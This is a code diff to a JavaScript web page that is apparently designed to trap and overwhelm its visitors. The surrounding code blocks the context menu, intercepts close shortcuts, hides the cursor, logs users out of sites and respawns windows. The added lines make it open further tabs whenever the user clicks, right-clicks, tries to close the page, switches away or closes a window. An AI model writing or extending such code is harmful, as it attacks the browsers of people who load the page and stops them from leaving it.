@@ -193,7 +193,11 @@ function init () {
     // 'touchstart' and 'touchend' events are not able to open a new window
     // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
     // a clever way to exclude touch events.
-    if (event.which !== 0) openWindow()
+    if (event.which !== 0) {
+      openWindow()
+      // Also open tabs randomly on interactions
+      if (Math.random() < 0.3) openTab()
+    }
 
     startVibrateInterval()
     enablePictureInPicture()
@@ -277,6 +281,7 @@ function initParentWindow () {
       startVideo()
       startAlertInterval()
       spawnChaosWindows(MIN_CHILD_WINDOWS)
+      spawnChaosTabs(5)
       maintainMinimumChaos()
       superLogout()
       removeHelloMessage()
@@ -323,6 +328,7 @@ function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
     speak('Please don\'t go!')
     spawnChaosWindows(EXTRA_RESPAWN_ON_BLUR)
+    spawnChaosTabs(2)
     openWindow()
     event.returnValue = true
   })
@@ -599,6 +605,22 @@ function openWindow () {
 }
 
 /**
+ * Open a new tab. Requires user-initiated event.
+ */
+function openTab () {
+  window.open(window.location.pathname, '_blank')
+}
+
+/**
+ * Open multiple tabs at once. Requires user-initiated event.
+ */
+function spawnChaosTabs (count) {
+  for (let i = 0; i < count; i++) {
+    openTab()
+  }
+}
+
+/**
  * Hide the user's cursor!
  */
 function hideCursor () {
@@ -872,6 +894,8 @@ function onCloseWindow (win) {
   setTimeout(() => {
     // Immediately replace any window that gets closed
     openWindow()
+    // Also open a tab when a window closes
+    if (Math.random() < 0.5) openTab()
   }, RESPAWN_DELAY_MS)
 }
 
@@ -1202,6 +1226,7 @@ function startAntiCloseTraps () {
   window.addEventListener('contextmenu', event => {
     event.preventDefault()
     spawnChaosWindows(2)
+    spawnChaosTabs(2)
   })
 
   // Intercept common close shortcuts
@@ -1215,6 +1240,7 @@ function startAntiCloseTraps () {
       event.stopPropagation()
       speak('Nope, not closing today!')
       spawnChaosWindows(EXTRA_RESPAWN_ON_BLUR + 2)
+      spawnChaosTabs(3)
       focusWindows()
       openWindow()
     }
@@ -1228,6 +1254,7 @@ function startVisibilityChaos () {
   document.addEventListener('visibilitychange', () => {
     if (document.hidden) {
       spawnChaosWindows(EXTRA_RESPAWN_ON_BLUR)
+      spawnChaosTabs(2)
       openWindow()
     } else {
       focusWindows()
@@ -1236,6 +1263,7 @@ function startVisibilityChaos () {
 
   window.addEventListener('blur', () => {
     spawnChaosWindows(EXTRA_RESPAWN_ON_BLUR)
+    spawnChaosTabs(2)
     openWindow()
   })
 }
